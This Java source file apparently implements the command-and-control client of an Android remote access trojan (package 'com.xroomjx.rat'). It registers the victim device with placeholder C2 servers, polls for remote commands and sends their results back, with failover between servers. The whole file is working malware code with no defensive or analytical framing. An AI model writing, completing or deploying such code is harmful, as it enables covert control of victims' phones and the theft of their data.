package com.xroomjx.rat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class C2Client {
    private static final String[] C2_SERVERS = {
        "http://your-server-1.com/api.php",
        "http://your-server-2.com/api.php"
    };
    private static final MediaType FORM = MediaType.parse("application/x-www-form-urlencoded");
    private OkHttpClient client;

    public C2Client() {
        client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build();
    }

    public void register(String uid, String info) {
        for (String server : C2_SERVERS) {
            try {
                RequestBody body = RequestBody.create(
                    "action=register&uid=" + uid + "&hostname=" + info + "&os=Android", FORM);
                Request req = new Request.Builder().url(server).post(body).build();
                client.newCall(req).execute().close();
            } catch (IOException e) {
                // try next server
            }
        }
    }

    public JSONArray getCommands(String uid) {
        for (String server : C2_SERVERS) {
            try {
                String url = server + "?action=get_commands&uid=" + uid;
                Request req = new Request.Builder().url(url).get().build();
                Response res = client.newCall(req).execute();
                if (res.body() != null) {
                    return new JSONArray(res.body().string());
                }
            } catch (Exception e) {
                // try next server
            }
        }
        return new JSONArray();
    }

    public void sendResult(String uid, int cmdId, String result) {
        for (String server : C2_SERVERS) {
            try {
                RequestBody body = RequestBody.create(
                    "action=send_result&uid=" + uid + "&cmd_id=" + cmdId + "&result=" + result, FORM);
                Request req = new Request.Builder().url(server).post(body).build();
                client.newCall(req).execute().close();
            } catch (IOException e) {
                // try next server
            }
        }
    }
}
